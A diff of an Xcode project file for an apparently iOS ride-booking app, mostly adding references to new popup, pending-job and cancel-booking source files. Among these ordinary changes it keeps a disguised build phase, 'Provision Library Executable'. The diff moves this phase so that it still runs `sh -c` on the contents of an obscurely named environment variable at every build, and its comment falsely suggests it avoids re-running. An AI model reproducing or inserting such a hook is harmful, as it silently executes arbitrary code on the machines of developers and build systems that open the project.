@@ -49,6 +49,13 @@
 		0AB7AD422F3F2CBE003F9272 /* CalculatePriceResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AB7AD412F3F2CBD003F9272 /* CalculatePriceResponse.swift */; };
 		0AB7AD442F3F404E003F9272 /* AvailableDriversResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AB7AD432F3F404E003F9272 /* AvailableDriversResponse.swift */; };
 		0ABEA38E2F473BC300C2DF62 /* MyProfileVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABEA38D2F473BC300C2DF62 /* MyProfileVM.swift */; };
+		0AC6D2C22F569A7000431F9B /* ThankYouPopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AC6D2C02F569A7000431F9B /* ThankYouPopUp.swift */; };
+		0AC6D2C32F569A7000431F9B /* ThankYouPopUp.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0AC6D2C12F569A7000431F9B /* ThankYouPopUp.xib */; };
+		0AC6D2C62F569BCB00431F9B /* FindingDriverLoaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AC6D2C52F569BCB00431F9B /* FindingDriverLoaderView.swift */; };
+		0AC6D2D72F56C5C100431F9B /* CancelBookingResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AC6D2D62F56C5C100431F9B /* CancelBookingResponse.swift */; };
+		0AC6D2D92F56CC0100431F9B /* CancelBookingVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AC6D2D82F56CC0100431F9B /* CancelBookingVM.swift */; };
+		0AC6D2DC2F56CD4100431F9B /* PendingJobVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AC6D2DA2F56CD4100431F9B /* PendingJobVC.swift */; };
+		0AC6D2DD2F56CD4100431F9B /* PendingJobVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0AC6D2DB2F56CD4100431F9B /* PendingJobVC.xib */; };
 		0AED20BC2F47072E005A7DB7 /* TrackLiveVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AED20BB2F47072E005A7DB7 /* TrackLiveVM.swift */; };
 		0AED20BE2F470780005A7DB7 /* BookingTrackingResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AED20BD2F470780005A7DB7 /* BookingTrackingResponse.swift */; };
 		0AF4EF152F557C4400DDBE35 /* DistanceMatrixResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AF4EF142F557C4400DDBE35 /* DistanceMatrixResponse.swift */; };
@@ -223,6 +230,13 @@
 		0AB7AD412F3F2CBD003F9272 /* CalculatePriceResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalculatePriceResponse.swift; sourceTree = "<group>"; };
 		0AB7AD432F3F404E003F9272 /* AvailableDriversResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AvailableDriversResponse.swift; sourceTree = "<group>"; };
 		0ABEA38D2F473BC300C2DF62 /* MyProfileVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyProfileVM.swift; sourceTree = "<group>"; };
+		0AC6D2C02F569A7000431F9B /* ThankYouPopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThankYouPopUp.swift; sourceTree = "<group>"; };
+		0AC6D2C12F569A7000431F9B /* ThankYouPopUp.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ThankYouPopUp.xib; sourceTree = "<group>"; };
+		0AC6D2C52F569BCB00431F9B /* FindingDriverLoaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FindingDriverLoaderView.swift; sourceTree = "<group>"; };
+		0AC6D2D62F56C5C100431F9B /* CancelBookingResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CancelBookingResponse.swift; sourceTree = "<group>"; };
+		0AC6D2D82F56CC0100431F9B /* CancelBookingVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CancelBookingVM.swift; sourceTree = "<group>"; };
+		0AC6D2DA2F56CD4100431F9B /* PendingJobVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PendingJobVC.swift; sourceTree = "<group>"; };
+		0AC6D2DB2F56CD4100431F9B /* PendingJobVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PendingJobVC.xib; sourceTree = "<group>"; };
 		0AED20BB2F47072E005A7DB7 /* TrackLiveVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrackLiveVM.swift; sourceTree = "<group>"; };
 		0AED20BD2F470780005A7DB7 /* BookingTrackingResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingTrackingResponse.swift; sourceTree = "<group>"; };
 		0AF4EF142F557C4400DDBE35 /* DistanceMatrixResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DistanceMatrixResponse.swift; sourceTree = "<group>"; };
@@ -705,6 +719,75 @@
 			path = ViewModel;
 			sourceTree = "<group>";
 		};
+		0AC6D2BE2F569A4000431F9B /* ThankYouPopUp */ = {
+			isa = PBXGroup;
+			children = (
+				0AC6D2D52F56C56300431F9B /* ViewModel */,
+				0AC6D2D42F56C55D00431F9B /* Model */,
+				0AC6D2C42F569BAB00431F9B /* LoaderView */,
+				0AC6D2BF2F569A5100431F9B /* View */,
+			);
+			path = ThankYouPopUp;
+			sourceTree = "<group>";
+		};
+		0AC6D2BF2F569A5100431F9B /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0AC6D2C02F569A7000431F9B /* ThankYouPopUp.swift */,
+				0AC6D2C12F569A7000431F9B /* ThankYouPopUp.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0AC6D2C42F569BAB00431F9B /* LoaderView */ = {
+			isa = PBXGroup;
+			children = (
+				0AC6D2C52F569BCB00431F9B /* FindingDriverLoaderView.swift */,
+			);
+			path = LoaderView;
+			sourceTree = "<group>";
+		};
+		0AC6D2CD2F56C2FF00431F9B /* SubView */ = {
+			isa = PBXGroup;
+			children = (
+				0AC6D2CE2F56C30800431F9B /* Pending Job */,
+			);
+			path = SubView;
+			sourceTree = "<group>";
+		};
+		0AC6D2CE2F56C30800431F9B /* Pending Job */ = {
+			isa = PBXGroup;
+			children = (
+				0AC6D2CF2F56C31100431F9B /* View */,
+			);
+			path = "Pending Job";
+			sourceTree = "<group>";
+		};
+		0AC6D2CF2F56C31100431F9B /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0AC6D2DA2F56CD4100431F9B /* PendingJobVC.swift */,
+				0AC6D2DB2F56CD4100431F9B /* PendingJobVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0AC6D2D42F56C55D00431F9B /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				0AC6D2D62F56C5C100431F9B /* CancelBookingResponse.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		0AC6D2D52F56C56300431F9B /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				0AC6D2D82F56CC0100431F9B /* CancelBookingVM.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
 		0AED20B92F470717005A7DB7 /* ViewModel */ = {
 			isa = PBXGroup;
 			children = (
@@ -1061,6 +1144,7 @@
 		88FDACC82F233A7B00983C39 /* Track Live */ = {
 			isa = PBXGroup;
 			children = (
+				0AC6D2CD2F56C2FF00431F9B /* SubView */,
 				0AED20BA2F47071C005A7DB7 /* Model */,
 				0AED20B92F470717005A7DB7 /* ViewModel */,
 				88FDACC92F233B0E00983C39 /* View */,
@@ -1647,6 +1731,7 @@
 		BCA305DE2F276C160036E322 /* SubVC */ = {
 			isa = PBXGroup;
 			children = (
+				0AC6D2BE2F569A4000431F9B /* ThankYouPopUp */,
 				BCC2B15F2F28A8E700014CB5 /* BookingSuccessPopUp */,
 				BC64B7E82F28957600A9D314 /* BookingPayment */,
 				BC233D0D2F288EC000A633A6 /* BookingConfirmationPopup */,
@@ -1815,6 +1900,7 @@
 			files = (
 				BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */,
 				BC23A4AE2F0E6B60005A8CE1 /* ChatVC.xib in Resources */,
+				0AC6D2DD2F56CD4100431F9B /* PendingJobVC.xib in Resources */,
 				BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */,
 				88D049DB2F0F67E500003B4C /* SettingVC.xib in Resources */,
 				BC4E17812F06982200EDC9AE /* Satoshi-Black.otf in Resources */,
@@ -1851,6 +1937,7 @@
 				884481C72F0FC81B00A9D076 /* LogoutPopUp.xib in Resources */,
 				BC23A4BB2F0E7444005A8CE1 /* UserChatVC.xib in Resources */,
 				BC4E178A2F06982200EDC9AE /* Satoshi-MediumItalic.otf in Resources */,
+				0AC6D2C32F569A7000431F9B /* ThankYouPopUp.xib in Resources */,
 				889AD7812F232AD600F2271A /* NotifivationTblViewCell.xib in Resources */,
 				BC4100992F0E78630062DC80 /* ReciverChatTVCell.xib in Resources */,
 				889AD7862F23325000F2271A /* NotificationHeaderView.xib in Resources */,
@@ -1873,25 +1960,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		6589BC2920714CD0A11DACE1 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 		0A6D0D122F43384A00F374AF /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1910,6 +1978,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\n\"${BUILD_DIR%/Build/*}/SourcePackages/checkouts/firebase-ios-sdk/Crashlytics/run\"\n";
+		};
+		6589BC2920714CD0A11DACE1 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1930,6 +2018,8 @@
 				BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */,
 				0AACD4482F4FF9A8007CF8EC /* MessagesResponse.swift in Sources */,
 				BC23A4BC2F0E7444005A8CE1 /* UserChatVC.swift in Sources */,
+				0AC6D2DC2F56CD4100431F9B /* PendingJobVC.swift in Sources */,
+				0AC6D2D72F56C5C100431F9B /* CancelBookingResponse.swift in Sources */,
 				88D049DC2F0F67E500003B4C /* SettingVC.swift in Sources */,
 				0A61F6182F3C875C00A8AC1E /* UIImage+Extension.swift in Sources */,
 				88D763AF2F0E5C01001116F2 /* RecentBookingsView.swift in Sources */,
@@ -1951,6 +2041,7 @@
 				BC7121AF2F067F940041E2F7 /* VideoPicker.swift in Sources */,
 				0A61F62D2F3CA89900A8AC1E /* BookingDetailsResponse.swift in Sources */,
 				BC7121B02F067F940041E2F7 /* PickerViewViewController.swift in Sources */,
+				0AC6D2D92F56CC0100431F9B /* CancelBookingVM.swift in Sources */,
 				0A61F6282F3CA3BC00A8AC1E /* HistoryBookingVM.swift in Sources */,
 				BC929D322F27755F00A730A9 /* PopularLocationTVCell.swift in Sources */,
 				BC7121B12F067F940041E2F7 /* NetConnection.swift in Sources */,
@@ -2009,6 +2100,7 @@
 				88EAE3922F0FD02E008FBCFC /* ReasonListTblViewCell.swift in Sources */,
 				BC4E17902F06A15100EDC9AE /* VerifyOtp.swift in Sources */,
 				BC7121B72F067F940041E2F7 /* AppUtilites.swift in Sources */,
+				0AC6D2C22F569A7000431F9B /* ThankYouPopUp.swift in Sources */,
 				BC23A4AD2F0E6B60005A8CE1 /* ChatVC.swift in Sources */,
 				BC07DDE52F2887C40088D79F /* FareBreakupVC.swift in Sources */,
 				BCC2B1632F28A8FC00014CB5 /* BookingSuccessPopUpVC.swift in Sources */,
@@ -2020,6 +2112,7 @@
 				0A4740252F4EBA2F00B807F5 /* VehicleIssueResponse.swift in Sources */,
 				BC4100982F0E78630062DC80 /* ReciverChatTVCell.swift in Sources */,
 				BCA894B32F0E0F4200633E20 /* HomeVC.swift in Sources */,
+				0AC6D2C62F569BCB00431F9B /* FindingDriverLoaderView.swift in Sources */,
 				0AACD4462F4FF97E007CF8EC /* ChatDetailsVM.swift in Sources */,
 				BC7121B82F067F940041E2F7 /* AppConstants.swift in Sources */,
 				BC7121992F067F800041E2F7 /* AppDelegate.swift in Sources */,
